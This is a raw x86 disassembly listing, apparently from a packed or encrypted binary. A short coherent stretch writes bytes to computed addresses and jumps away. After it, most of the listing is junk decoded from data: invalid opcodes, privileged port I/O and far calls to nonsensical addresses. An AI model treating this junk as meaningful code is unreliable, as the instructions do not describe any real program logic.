  4060ab:	mov    al,BYTE PTR [ebp-0x1]
  4060ae:	mov    edx,DWORD PTR [ebp-0x30]
  4060b1:	mov    ebx,DWORD PTR [ebp-0xc]
  4060b4:	xor    edx,esi
  4060b6:	add    edx,edi
  4060b8:	imul   edx,ebx
  4060bb:	mov    ebx,DWORD PTR [ebp-0x8]
  4060be:	mov    BYTE PTR [edx+ebx*1],al
  4060c1:	mov    eax,DWORD PTR [ebp-0x30]
  4060c4:	mov    edx,DWORD PTR [ebp-0xc]
  4060c7:	xor    eax,esi
  4060c9:	add    eax,edi
  4060cb:	imul   eax,edx
  4060ce:	mov    edx,DWORD PTR [ebp-0x8]
  4060d1:	jmp    0x408469
  4060d6:	leave  
  4060d7:	pop    es
  4060d8:	xchg   DWORD PTR ds:0x47490549,eax
  4060de:	(bad)  
  4060df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060e0:	or     bl,cl
  4060e2:	adc    al,0x9
  4060e4:	iret   
  4060e5:	addr16 jno 0x4060a9
  4060e8:	jnp    0x406165
  4060ea:	hlt    
  4060eb:	pushf  
  4060ec:	jnp    0x406169
  4060ee:	xchg   edi,ecx
  4060f0:	adc    eax,0x2bef1b97
  4060f5:	stos   DWORD PTR es:[edi],eax
  4060f6:	xor    eax,0x4a09e8ae
  4060fb:	lods   al,BYTE PTR ds:[esi]
  4060fc:	or     DWORD PTR [eax+eiz*1+0x6e],0x76b23d7a
  406104:	mov    cl,0xbc
  406106:	ror    eax,cl
  406108:	jmp    0x2ac9a9d0
  40610d:	adc    ch,BYTE PTR [eax]
  40610f:	mov    ch,0x1
  406111:	hlt    
  406112:	mov    al,ds:0xc5e16b75
  406117:	popa   
  406118:	xchg   esi,eax
  406119:	cli    
  40611a:	retf   
  40611b:	add    cl,bl
  40611d:	test   al,0x1
  40611f:	inc    ecx
  406120:	pop    es
  406121:	lods   al,BYTE PTR ds:[esi]
  406122:	shl    al,cl
  406124:	push   esi
  406125:	in     eax,dx
  406126:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406127:	nop
  406128:	jno    0x406160
  40612a:	mov    bh,0x7e
  40612c:	dec    esp
  40612d:	lods   al,BYTE PTR ds:[esi]
  40612e:	sbb    esi,DWORD PTR [edx-0x6f8e70bb]
  406134:	shl    DWORD PTR [edx-0x2740de77],1
  40613a:	cmp    al,0x6a
  40613c:	rol    DWORD PTR [edx-0x5f],1
  40613f:	xchg   ebx,eax
  406140:	test   DWORD PTR [esi+0x62a0fd9],ecx
  406146:	out    0xb5,eax
  406148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406149:	inc    ebx
  40614a:	out    0xb6,eax
  40614c:	pop    es
  40614d:	std    
  40614e:	fisub  DWORD PTR [eax]
  406150:	das    
  406151:	mov    edx,0xae8c32d4
  406156:	xor    edx,esi
  406158:	mov    dl,0x76
  40615a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40615b:	jns    0x4060e5
  40615d:	fwait
  40615e:	jne    0x40616f
  406160:	out    dx,al
  406161:	stos   DWORD PTR es:[edi],eax
  406162:	push   esp
  406163:	into   
  406164:	and    BYTE PTR [eax+0x48],dl
  406167:	or     BYTE PTR [edx],ch
  406169:	loope  0x40619d
  40616b:	arpl   WORD PTR [ecx-0x13f2183f],dx
  406171:	ret    0xe7b5
  406174:	jbe    0x406151
  406176:	sbb    DWORD PTR [ebx],ebp
  406178:	iret   
  406179:	inc    esi
  40617a:	add    al,0x27
  40617c:	inc    esp
  40617d:	addr16 nop
  40617f:	inc    esp
  406180:	pop    ecx
  406181:	mov    ebp,0x4ae0e236
  406186:	jne    0x40619e
  406188:	mov    ebx,esp
  40618a:	nop
  40618b:	sbb    al,BYTE PTR [esi-0x3d9ca720]
  406191:	adc    cl,BYTE PTR [si+0x18]
  406195:	mov    al,0x69
  406197:	ins    DWORD PTR es:[edi],dx
  406198:	mov    ch,0x9f
  40619a:	ss aad 0xfb
  40619d:	mov    ah,BYTE PTR [esi+0x7aadd424]
  4061a3:	icebp  
  4061a4:	test   BYTE PTR es:[eax+0x61c80774],ah
  4061ab:	and    eax,0xeb1b75c4
  4061b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061b1:	and    ch,ah
  4061b3:	(bad)  
  4061b4:	xchg   DWORD PTR [ecx-0x79255f5b],esp
  4061ba:	push   eax
  4061bb:	jge    0x406154
  4061bd:	and    BYTE PTR [esp+ebp*1-0x64],0xb4
  4061c2:	in     al,dx
  4061c3:	jg     0x40617d
  4061c5:	loop   0x40623e
  4061c7:	ja     0x4061f3
  4061c9:	xlat   BYTE PTR ds:[ebx]
  4061ca:	push   0xc223c14c
  4061cf:	and    eax,0x3a24e0df
  4061d4:	xchg   BYTE PTR [ecx],bl
  4061d6:	test   eax,0xb436d7f6
  4061db:	push   ecx
  4061dc:	ret    
  4061dd:	mov    ch,BYTE PTR [edx+edx*4]
  4061e0:	pop    es
  4061e1:	and    BYTE PTR [ecx-0x39],bh
  4061e4:	xchg   esi,eax
  4061e5:	dec    edi
  4061e6:	sub    DWORD PTR [ecx+0x5f],edi
  4061e9:	call   0x54f:0x90cf561b
  4061f0:	mov    dh,BYTE PTR [edx+0x60]
  4061f3:	or     DWORD PTR [esi+0xd],esi
  4061f6:	popf   
  4061f7:	(bad)  
  4061f8:	fbld   TBYTE PTR [ebx]
  4061fa:	pop    edi
  4061fb:	mov    ebp,0xb88307a9
  406200:	pop    edi
  406201:	jge    0x406249
  406203:	jl     0x40619e
  406205:	ins    DWORD PTR es:[edi],dx
  406206:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406207:	mov    ds:0xa740f2e3,eax
  40620c:	les    ecx,FWORD PTR [esi+ebx*4-0x56]
  406210:	jecxz  0x40623a
  406212:	pop    edx
  406213:	cld    
  406214:	shl    BYTE PTR [edi],1
  406216:	stos   DWORD PTR es:[edi],eax
  406217:	push   ecx
  406218:	xor    BYTE PTR [esi],0x9c
  40621b:	scas   eax,DWORD PTR es:[edi]
  40621c:	or     ecx,DWORD PTR ds:0xbc686638
  406222:	xchg   edx,eax
  406223:	adc    eax,0x298a2748
  406228:	hlt    
  406229:	not    al
  40622b:	mov    esi,edi
  40622d:	mov    esp,DWORD PTR [edx-0x55]
  406230:	ins    BYTE PTR es:[edi],dx
  406231:	sub    al,0x19
  406233:	ds out dx,eax
  406235:	mov    cl,0x5e
  406237:	inc    esp
  406238:	fstp   QWORD PTR [esi+0x7998e37]
  40623e:	jg     0x40627b
  406240:	mov    ah,0x3c
  406242:	ins    DWORD PTR es:[edi],dx
  406243:	shl    edx,cl
  406245:	mov    ecx,0xd8015bf0
  40624a:	sbb    edx,DWORD PTR [ebx-0x17]
  40624d:	or     eax,0xd61c2418
  406252:	call   0xe050fe69
  406257:	leave  
  406258:	inc    ebx
  406259:	push   ebp
  40625a:	ds xchg esp,eax
  40625c:	jmp    0x4061ef
  40625e:	loopne 0x40625a
  406260:	jns    0x4061eb
  406262:	mov    bl,BYTE PTR [esi+0x266b494e]
  406268:	mov    ah,0x57
  40626a:	xchg   ebp,eax
  40626b:	fst    QWORD PTR [edx]
  40626d:	cmp    DWORD PTR [ebx+edi*1+0x3af016b5],eax
  406274:	dec    ebp
  406275:	ja     0x406235
  406277:	pop    edx
  406278:	and    edx,0xaaf1e48c
  40627e:	sub    dh,BYTE PTR [ebp-0x31]
  406281:	sub    esi,DWORD PTR [esi-0x5e]
  406284:	imul   edx,DWORD PTR [edi-0x28],0xffffffb2
  406288:	push   ds
  406289:	idiv   DWORD PTR [edx+0x1f15788e]
  40628f:	stos   BYTE PTR es:[edi],al
  406290:	push   0x6d14121e
  406295:	(bad)
  406298:	out    dx,al
  406299:	xchg   ecx,eax
  40629a:	mov    al,0xa6
  40629c:	cdq    
  40629d:	fimul  DWORD PTR [eax+0x31]
  4062a0:	stos   BYTE PTR es:[edi],al
  4062a1:	mov    BYTE PTR [eax],al
  4062a3:	or     ebp,DWORD PTR [edx]
  4062a5:	pop    edx
  4062a6:	push   ebx
  4062a8:	mov    ebp,0xb1c860c6
  4062ad:	out    0xa1,eax
  4062af:	out    0x4e,al
  4062b1:	xchg   ecx,eax
  4062b2:	jo     0x4062bb
  4062b4:	push   ebp
  4062b5:	inc    esp
  4062b6:	pop    esp
  4062b7:	repz adc eax,DWORD PTR [esi-0x10]
  4062bb:	fnstenv ds:0xd2a850cf
  4062c1:	jp     0x40630b
  4062c3:	int    0xea
  4062c5:	push   ebp
  4062c6:	test   al,0x7d
  4062c8:	lods   al,BYTE PTR ds:[esi]
  4062c9:	or     eax,DWORD PTR [esi+ebp*1-0x72]
  4062cd:	call   0xeafc:0x105d70bc
  4062d4:	cli    
  4062d5:	stc    
  4062d6:	mov    cl,0xba
  4062d8:	mov    esp,0x18b4c48f
  4062dd:	test   BYTE PTR ds:0x6be70ce,al
  4062e3:	ret    0x8f5a
  4062e6:	xchg   ebx,eax
  4062e7:	inc    ecx
  4062e8:	fild   DWORD PTR ds:0x1a64268e
  4062ee:	mov    BYTE PTR [esi-0x31],bh
  4062f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062f2:	cmp    eax,0x1da24add
  4062f7:	xor    eax,0x64cee4b3
  4062fc:	mov    al,0xbf
  4062fe:	ins    BYTE PTR es:[edi],dx
  4062ff:	fsubr  QWORD PTR fs:[edi+0x69284c84]
  406306:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406307:	js     0x4062a3
  406309:	mov    esi,DWORD PTR [edi+0x17]
  40630c:	pusha  
  40630d:	or     bl,dh
  40630f:	cmc    
  406310:	scas   al,BYTE PTR es:[edi]
  406311:	stc    
  406312:	jb     0x406303
  406314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406315:	mov    ebp,0x233d6a5a
  40631a:	jne    0x406379
  40631c:	xchg   edx,eax
  40631d:	stos   BYTE PTR es:[edi],al
  40631e:	sti    
  40631f:	int    0x72
  406321:	or     esp,edx
  406323:	sahf   
  406324:	cmc    
  406325:	add    DWORD PTR [ebp-0x80],edx
  406328:	xor    cl,al
  40632a:	mov    ebp,0x5e68357a
  40632f:	xlat   BYTE PTR ds:[ebx]
  406330:	call   0x57b7:0x11c1c7ca
  406337:	or     BYTE PTR [ecx+ebp*2],bh
  40633a:	in     eax,dx
  40633b:	fimul  WORD PTR [ebx]
  40633d:	push   0xfffffffb
  40633f:	ss cli 
  406341:	xor    eax,0xe5dab3f
  406346:	add    ebp,DWORD PTR [edx-0x29]
  406349:	jno    0x406318
  40634b:	jne    0x4063ac
  40634d:	cli    
  40634e:	test   BYTE PTR es:[esp+ebp*4-0x6b],al
  406353:	repz (bad) 
  406355:	mov    WORD PTR [ebp-0x7cfb3787],fs
  40635b:	and    al,0x8a
  40635d:	dec    eax
  40635e:	mov    ah,0x52
  406360:	pusha  
  406361:	jmp    0x406350
  406363:	or     esp,esp
  406365:	test   dh,ch
  406367:	mov    cl,0xb7
  406369:	sbb    DWORD PTR [ebx+eiz*8-0x20],esi
  40636d:	push   edx
  40636e:	clc    
  40636f:	shl    esi,cl
  406371:	or     edi,DWORD PTR [edi-0x18]
  406374:	imul   ecx,DWORD PTR [edx-0x5d36fe57],0xffffffcc
  40637b:	mov    ah,0x42
  40637d:	push   ss
  40637e:	jl     0x406327
  406380:	jmp    0x2846:0x89051b5e
  406387:	mov    dh,0x69
  406389:	in     eax,0xd6
  40638b:	iret   
  40638c:	inc    esi
  40638d:	ins    DWORD PTR es:[edi],dx
  40638e:	ins    DWORD PTR es:[edi],dx
  40638f:	aam    0xdc
  406391:	in     eax,dx
  406392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406393:	outs   dx,DWORD PTR ds:[esi]
  406394:	sbb    BYTE PTR [esp+ecx*2],dh
  406397:	xchg   esi,eax
  406398:	xchg   ebx,eax
  406399:	(bad)  
  40639a:	lahf   
  40639b:	push   esi
  40639c:	cdq    
  40639d:	das    
  40639e:	mov    WORD PTR [ecx],?
  4063a0:	jge    0x406417
  4063a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063a3:	out    dx,al
  4063a4:	cwde   
  4063a5:	fld    TBYTE PTR [edx]
  4063a7:	adc    al,0xbb
  4063a9:	call   0x9fb5:0xcdf7a8a8
  4063b0:	test   DWORD PTR [ecx+ebp*8],edx
  4063b3:	shl    eax,1
  4063b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063b6:	push   esp
  4063b7:	mov    eax,0x50a1dea6
  4063bc:	iret   
  4063bd:	cs scas eax,DWORD PTR es:[edi]
  4063bf:	test   DWORD PTR [ebx],0x1b690900
  4063c5:	popa   
  4063c6:	sbb    al,BYTE PTR [edi+0x12]
  4063c9:	aaa    
  4063ca:	inc    esi
  4063cb:	sub    bh,cl
  4063cd:	hlt    
  4063ce:	pop    ss
  4063cf:	retf   0x33cf
  4063d2:	into   
  4063d3:	iret   
  4063d4:	(bad)  
  4063d6:	cmp    BYTE PTR [eax],cl
  4063d8:	xchg   ebp,eax
  4063d9:	fwait
  4063da:	mov    al,ds:0x76e0a7db
  4063df:	int3   
  4063e0:	push   eax
  4063e1:	push   esi
  4063e2:	xchg   ebp,eax
  4063e3:	fadd   QWORD PTR [edx+0x7b24e839]
  4063e9:	ror    DWORD PTR [esi-0x950a212],0xca
  4063f0:	fimul  WORD PTR [edi+0x5a33ba8d]
  4063f6:	jne    0x406463
  4063f8:	dec    esi
  4063f9:	add    BYTE PTR ds:0x434b768e,0x1c
  406400:	jae    0x40638f
  406402:	shr    edx,0xec
  406405:	sub    BYTE PTR [ebx],ch
  406407:	jns    0x4063c5
  406409:	aaa    
  40640a:	push   edi
  40640b:	mov    BYTE PTR [ebx+0x2541205],ch
  406411:	js     0x406484
  406413:	ins    DWORD PTR es:[edi],dx
  406414:	sub    DWORD PTR [ecx+0x4ebfcb75],esp
  40641a:	lock fnstenv [ecx+esi*2-0x60740b8f]
  406422:	je     0x406425
  406424:	ins    DWORD PTR es:[edi],dx
  406425:	mov    ebp,edx
  406427:	xor    ch,BYTE PTR [edi-0x6bf1ce8f]
  40642d:	lods   eax,DWORD PTR ds:[esi]
  40642e:	ret    
  40642f:	into   
  406430:	lock fdivr st(2),st
  406433:	(bad)  
  406434:	or     al,BYTE PTR [eax-0x269b8c3c]
  40643a:	cwde   
  40643b:	dec    eax
  40643c:	push   es
  40643d:	out    0x57,al
  40643f:	int    0x8d
  406441:	mov    cl,0xba
  406443:	mov    ds:0xa689c244,eax
  406448:	call   0x58ac:0xc3e6e3e1
  40644f:	mov    es,WORD PTR [eax+0x55]
  406452:	jae    0x406490
  406454:	out    0xdb,eax
  406456:	out    0xda,eax
  406458:	ret    
  406459:	adc    ch,dh
  40645b:	jle    0x406478
  40645d:	fsub   QWORD PTR [eax]
  40645f:	adc    dh,ch
  406461:	jecxz  0x406450
  406463:	dec    ecx
  406464:	(bad)  
  406466:	neg    DWORD PTR [eax-0x14]
  406469:	in     al,0x0
  40646b:	aad    0xa4
  40646d:	(bad)  
  40646e:	fmul   st,st(4)
  406470:	xor    edi,DWORD PTR [eax-0x68a5bab5]
  406476:	(bad)
  406479:	popf   
  40647a:	clc    
  40647b:	mov    esp,0x24bd150d
  406480:	retf   
  406481:	(bad)  
  406482:	mov    ecx,DWORD PTR [eax-0x66179a1e]
  406488:	pop    esp
  406489:	jp     0x406495
  40648b:	mov    ebp,0xc43682fc
  406490:	mov    dl,0xb2
  406492:	jle    0x406506
  406494:	test   eax,0x26454c2a
  406499:	jecxz  0x40649d
  40649b:	out    dx,eax
  40649c:	(bad)  
  40649d:	inc    edx
  40649e:	xor    ch,BYTE PTR [ecx+ebp*1-0x80]
  4064a2:	xchg   edx,eax
  4064a3:	xor    al,BYTE PTR [edx+0xd]
  4064a6:	jmp    0x406457
  4064a8:	out    dx,al
  4064a9:	mov    edx,0xc315c5cd
  4064ae:	mov    eax,0x76f9dbfd
  4064b3:	fild   DWORD PTR [ebx+0x78b625c3]
  4064b9:	cmc    
  4064ba:	inc    esi
  4064bb:	enter  0xae7a,0xe7
  4064bf:	pop    eax
  4064c0:	mov    al,0xdc
  4064c2:	push   0x9e57b6df
  4064c7:	mov    eax,0xbfad5a16
  4064cc:	push   esi
  4064cd:	xchg   esp,eax
  4064ce:	and    dl,ah
  4064d0:	aad    0x9f
  4064d2:	scas   al,BYTE PTR es:[edi]
  4064d3:	(bad)  [ebp+0x4ec7a39e]
  4064d9:	sbb    al,0x31
  4064db:	test   eax,0xe2e3697
  4064e0:	mov    ebx,0x542e09f1
  4064e5:	mov    edi,0x66b26dbd
  4064ea:	sub    BYTE PTR [ebp-0x5a],dl
  4064ed:	enter  0x4553,0x81
  4064f1:	or     edx,ebp
  4064f3:	pop    es
  4064f4:	shr    DWORD PTR [edx+esi*1-0x1a],cl
  4064f8:	hlt    
  4064f9:	shl    BYTE PTR [ebp+0x6e],1
  4064fc:	sahf   
  4064fd:	adc    eax,0x40b4cf4f
  406502:	add    BYTE PTR [ebx],cl
  406504:	in     al,dx
  406505:	dec    ebx
  406506:	js     0x406549
  406508:	jmp    0xfc72:0x3264a147
  40650f:	and    dl,ah
  406511:	xchg   esp,eax
  406512:	fnstsw WORD PTR [ebx+edi*8-0x7684d385]
  406519:	out    0xfa,al
  40651b:	adc    al,0x95
  40651d:	ret    
  40651e:	jno    0x406554
  406520:	lock push cs
  406522:	fwait
  406523:	push   ds
  406524:	sub    bl,bh
  406526:	push   edi
  406527:	cmp    al,0x5d
  406529:	ret    0x8205
  40652c:	dec    esi
  40652d:	sti    
  40652e:	xchg   esi,eax
  40652f:	loope  0x406515
  406531:	mov    WORD PTR [edx+0x35],ss
  406534:	out    0xd1,eax
  406536:	inc    edx
  406537:	aaa    
  406538:	or     al,0xad
  40653a:	push   edx
  40653b:	test   BYTE PTR ds:0xee549196,ch
  406541:	cli    
  406542:	push   ebp
  406543:	push   ebx
  406544:	bound  esi,QWORD PTR [esi]
  406546:	(bad)  
  406547:	xchg   DWORD PTR [ebp+0x42e1915d],edi
  40654d:	out    dx,eax
  40654e:	jg     0x40657e
  406550:	xor    DWORD PTR [ecx-0xc9eca6c],esp
  406556:	lahf   
  406557:	test   edx,edx
  406559:	(bad)  [ebp-0x3854a1ab]
  40655f:	mov    esp,0xdcbb8cf4
  406564:	adc    bl,bl
  406566:	cwde   
  406567:	lods   eax,DWORD PTR ds:[esi]
  406568:	gs mov ebp,0x56925738
  40656e:	xchg   ecx,eax
  40656f:	rcr    ch,cl
  406571:	mov    ch,0xe4
  406573:	int3   
  406574:	std    
  406575:	add    bh,dh
  406577:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406578:	inc    esi
  406579:	or     ecx,DWORD PTR [ecx]
  40657b:	es pop es
  40657d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40657e:	ds jge 0x4065d4
  406581:	(bad)  
  406582:	xchg   dx,ax
  406584:	adc    esi,edx
  406586:	repnz xor dl,BYTE PTR [edi-0x74]
  40658a:	fstp   DWORD PTR [edx]
  40658c:	sbb    DWORD PTR [edi],ebp
  40658e:	outs   dx,DWORD PTR ds:[esi]
  40658f:	inc    eax
  406590:	out    dx,al
  406591:	mov    esp,DWORD PTR [ebp+0x20409e03]
  406597:	addr16 ds xor al,0x42
  40659b:	mov    ebp,0xb1e1f8d3
  4065a0:	dec    esp
  4065a1:	add    bl,dl
  4065a3:	fisttp QWORD PTR [eax]
  4065a5:	loopne 0x4065af
  4065a7:	mov    dl,0x15
  4065a9:	test   DWORD PTR [ebp-0x2f],esi
  4065ac:	cs out 0x52,eax
  4065af:	jbe    0x406615
  4065b1:	jmp    0xf085:0xe3bedb75
  4065b8:	adc    al,0xe3
  4065ba:	sti    
  4065bb:	jb     0x406589
  4065bd:	cmp    esp,edx
  4065bf:	or     ah,al
  4065c1:	pop    ecx
  4065c2:	clc    
  4065c3:	ret    
  4065c4:	mov    ds,WORD PTR [esi-0x1c]
  4065c7:	inc    edi
  4065c8:	mov    esp,0x702c9899
  4065cd:	jb     0x406565
  4065cf:	cmc    
  4065d0:	inc    ebp
  4065d1:	push   ds
  4065d2:	and    edx,eax
  4065d4:	pop    ss
  4065d5:	jmp    0x4065bd
  4065d7:	cmp    BYTE PTR [ecx],ch
  4065d9:	call   0xf492:0x2f601a60
  4065e0:	cmp    al,0xc9
  4065e2:	push   eax
  4065e3:	xor    eax,0xb012754d
  4065e8:	adc    DWORD PTR [ebx+ecx*1+0x5e74568c],ebx
  4065ef:	push   0xdd24134b
  4065f4:	xchg   BYTE PTR [ebx+edi*8+0x416f3ca0],cl
  4065fb:	mov    esi,0x5d8e1da4
  406600:	leave  
  406601:	pop    ss
  406602:	mov    BYTE PTR ds:[esi+ebp*8+0x172b0ae0],al
  40660a:	cmp    cl,al
  40660c:	inc    esi
  40660d:	jno    0x40660e
  40660f:	pop    ecx
  406610:	lds    ebx,FWORD PTR [eax+0x1b]
  406613:	jo     0x4065a9
  406615:	stc    
  406616:	mov    edx,0x14b52189
  40661b:	add    edi,ecx
  40661d:	dec    ebx
  40661e:	fmul   DWORD PTR [ecx]
  406620:	fadd   QWORD PTR [eax-0x57111c31]
  406626:	aaa    
  406627:	xchg   esi,eax
  406628:	rcr    BYTE PTR [edx+0xf],cl
  40662b:	out    0x21,al
  40662d:	and    al,0x66
  40662f:	retf   
  406630:	push   0x7
  406632:	and    DWORD PTR [eax-0x3b],ebp
  406635:	out    0x2c,al
  406637:	data16 jnp 0x406688
  40663a:	xchg   ecx,eax
  40663b:	lds    ebx,FWORD PTR ds:0x6ebe647c
  406641:	cdq    
  406642:	scas   eax,DWORD PTR es:[edi]
  406643:	loopne 0x406609
  406645:	arpl   WORD PTR [ecx-0x60],bx
  406648:	sbb    al,0x22
  40664a:	loop   0x4066bf
  40664c:	(bad)  
  40664d:	adc    eax,0x551ebeca
  406652:	push   cs
  406653:	(bad)  
  406654:	shl    ch,cl
  406656:	sbb    al,0x42
  406658:	push   eax
  406659:	sub    edx,DWORD PTR [eax]
  40665b:	(bad)  
  40665c:	(bad)  
  40665d:	fwait
  40665e:	add    ebx,DWORD PTR [edi+0x2a50d16d]
  406664:	dec    ebp
  406665:	aas    
  406666:	stos   BYTE PTR es:[edi],al
  406667:	retf   0x5195
  40666a:	retf   0x834c
  40666d:	jg     0x40662f
  40666f:	jnp    0x4066b5
  406671:	aad    0xba
  406673:	iret   
  406674:	rcl    DWORD PTR [ebx],cl
  406676:	jbe    0x40660d
  406678:	mov    cl,0x73
  40667a:	sahf   
  40667b:	mov    ch,0xfd
  40667d:	and    DWORD PTR [edi+0x19],edx
  406680:	ret    0x47c0
  406683:	mov    ch,ch
  406685:	in     al,dx
  406686:	pop    edi
  406687:	sbb    al,0x11
  406689:	jo     0x406636
  40668b:	jg     0x4066fe
  40668d:	bound  esp,QWORD PTR [eax+0x8]
  406690:	dec    eax
  406691:	std    
  406692:	sahf   
  406693:	xchg   ebp,eax
  406694:	cmp    BYTE PTR [eax+0x51],ch
  406697:	sbb    eax,0xc691251
  40669c:	xchg   esi,eax
  40669d:	lock mov edi,ecx
  4066a0:	sub    ebp,DWORD PTR [edx-0xee675f6]
  4066a6:	je     0x4066ad
  4066a8:	or     DWORD PTR [esi-0x1aa4d476],ebx
  4066ae:	dec    eax
  4066af:	(bad)
  4066b2:	dec    esp
  4066b3:	imul   ebp,DWORD PTR [ebp+0x1],0xffffffc1
  4066b7:	into   
  4066b8:	pop    edi
  4066b9:	(bad)  
  4066ba:	mov    al,0x58
  4066bc:	neg    DWORD PTR [ebp+0x905a96e]
  4066c2:	rcl    bl,1
  4066c4:	loopne 0x406652
  4066c6:	out    dx,al
  4066c7:	push   edi
  4066c8:	fcomp  DWORD PTR [ecx-0x6]
  4066cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066cd:	fdiv   QWORD PTR [eax]
  4066cf:	out    0x4a,al
  4066d1:	push   ecx
  4066d2:	lods   eax,DWORD PTR ds:[esi]
  4066d3:	and    eax,0xb3333763
  4066d8:	xor    DWORD PTR [eax-0x2ff14974],0x1d78ff9d
  4066e2:	lea    esi,[ecx+0x45a4fdb2]
  4066e8:	pop    edi
  4066e9:	add    cl,BYTE PTR [ebx-0x76]
  4066ec:	test   ebp,eax
  4066ee:	push   0xffffffe5
  4066f0:	xchg   edx,eax
  4066f1:	cdq    
  4066f2:	pop    edi
  4066f3:	mov    esi,0x5b7255e
  4066f8:	xor    bl,BYTE PTR [ecx+0x4c]
  4066fb:	add    DWORD PTR [edx-0x18],0x2e
  4066ff:	cld    
  406700:	mov    ebx,0x27441b3
  406705:	xchg   bh,bl
  406707:	outs   dx,DWORD PTR ds:[esi]
  406708:	mov    ds:0xc42a86ea,eax
  40670d:	xor    al,0xe1
  40670f:	int3   
  406710:	stos   BYTE PTR es:[edi],al
  406711:	cmp    al,0xb5
  406713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406714:	addr16 add eax,0x4057a681
  40671a:	adc    eax,0x90668449
  40671f:	push   ecx
  406720:	add    DWORD PTR [ebx],edx
  406722:	mul    DWORD PTR [eax+edx*2-0x71fbe7d9]
  406729:	jb     0x4066cf
  40672b:	scas   eax,DWORD PTR es:[edi]
  40672c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40672d:	in     al,0xa1
  40672f:	mov    al,0xef
  406731:	(bad)  
  406733:	mov    dl,0xeb
  406735:	mov    eax,ds:0xe0e1d8e6
  40673a:	ss jg  0x4066eb
  40673d:	mov    dl,0x89
  40673f:	std    
  406740:	inc    ebx
  406741:	pushaw 
  406743:	xor    BYTE PTR [edx+0x35],dh
  406746:	jb     0x4066f8
  406748:	add    DWORD PTR [eax],esi
  40674a:	ds pushf 
  40674c:	out    0x42,eax
  40674e:	mov    ebp,0x18c21f58
  406753:	push   esp
  406754:	les    ebx,FWORD PTR [ecx]
  406756:	xor    DWORD PTR [ecx+0x54c70a52],0xeb2764b9
  406760:	jmp    0x4067d9
  406762:	add    bl,0x39
  406765:	call   0xc5c10ca8
  40676a:	inc    ebp
  40676b:	(bad)  
  40676c:	fwait
  40676d:	xor    DWORD PTR [ecx],edi
  40676f:	xor    ebx,DWORD PTR [edi+edi*4+0x38]
  406773:	pop    ecx
  406774:	stc    
  406775:	loope  0x406745
  406777:	add    al,0xf9
  406779:	fld    QWORD PTR [bx-0x5c]
  40677d:	out    dx,al
  40677e:	and    BYTE PTR [ebx-0x7bbb5ce0],bl
  406784:	mov    ch,0xfc
  406786:	mov    ecx,0x7ae7365
  40678b:	popf   
  40678c:	fisttp DWORD PTR [eax+0x7e79672b]
  406792:	hlt    
  406793:	mov    edi,0x6e3434e9
  406798:	push   esp
  406799:	xchg   ecx,eax
  40679a:	mov    bl,0xd2
  40679c:	mov    ah,0x7a
  40679e:	xchg   DWORD PTR [esi-0x7460ef0e],esp
  4067a4:	fisttp DWORD PTR [ecx-0xa]
  4067a7:	repnz clc 
  4067a9:	jae    0x4067d4
  4067ab:	sub    BYTE PTR [ecx+edi*2+0x275a8492],dl
  4067b2:	gs dec esi
  4067b4:	jp     0x406794
  4067b6:	jmp    0x4cdd:0xc5e42f10
  4067bd:	and    dl,dl
  4067bf:	pop    ebx
  4067c0:	stc    
  4067c1:	inc    ebx
  4067c2:	dec    esi
  4067c4:	sub    al,0x49
  4067c6:	int    0xfb
  4067c8:	les    ebx,FWORD PTR [edx-0x5b6d82a4]
  4067ce:	xchg   DWORD PTR [esi+0x383ceccb],ebp
  4067d4:	int    0xa9
  4067d6:	leave  
  4067d7:	leave  
  4067d8:	mov    edx,0x63ac3a5b
  4067dd:	gs push eax
  4067df:	dec    cl
  4067e1:	pop    ds
  4067e2:	xor    cl,BYTE PTR [ebp+0x79c73766]
  4067e8:	jle    0x40678b
  4067ea:	es mov eax,0x13b06207
  4067f0:	mov    BYTE PTR es:[bx],dl
  4067f4:	push   0x31
  4067f6:	inc    esi
  4067f7:	retf   0x8e83
  4067fa:	shl    BYTE PTR [esi+0x78],0x41
  4067fe:	pop    edi
  4067ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406800:	xchg   ebx,eax
  406801:	hlt    
  406802:	cmc    
  406803:	cdq    
  406804:	cmp    eax,0xe675bb36
  406809:	(bad)  
  40680a:	loope  0x4067ac
  40680c:	jo     0x406835
  40680e:	sub    al,BYTE PTR [ebx]
  406810:	jp     0x406827
  406812:	fwait
  406813:	mov    ebx,0x25aa2254
  406818:	cld    
  406819:	daa    
  40681a:	rcl    eax,1
  40681c:	repz dec ebx
  40681e:	and    ch,BYTE PTR [ebp-0x5951f9cd]
  406824:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406825:	dec    edx
  406826:	aaa    
  406827:	inc    ebp
  406828:	in     eax,dx
  406829:	cwde   
  40682a:	mov    eax,ds:0xd3a92d54
  40682f:	pop    eax
  406830:	je     0x4067d9
  406832:	ds pop edi
  406834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406835:	jne    0x406841
  406837:	and    ebx,0x79
  40683a:	xor    eax,0x26214542
  40683f:	pushf  
  406840:	js     0x4068a3
  406842:	mov    dh,0xe3
  406844:	inc    eax
  406845:	imul   edi,ebx,0x26
  406848:	xlat   BYTE PTR ds:[ebx]
  406849:	int3   
  40684a:	loopne 0x406844
  40684c:	mov    ecx,0xd6601a5d
  406851:	push   ds
  406852:	clc    
  406853:	loop   0x4067e2
  406855:	enter  0x47a5,0x55
  406859:	cmp    al,0xe2
  40685b:	mov    esi,DWORD PTR [esi+0x2efe6ce7]
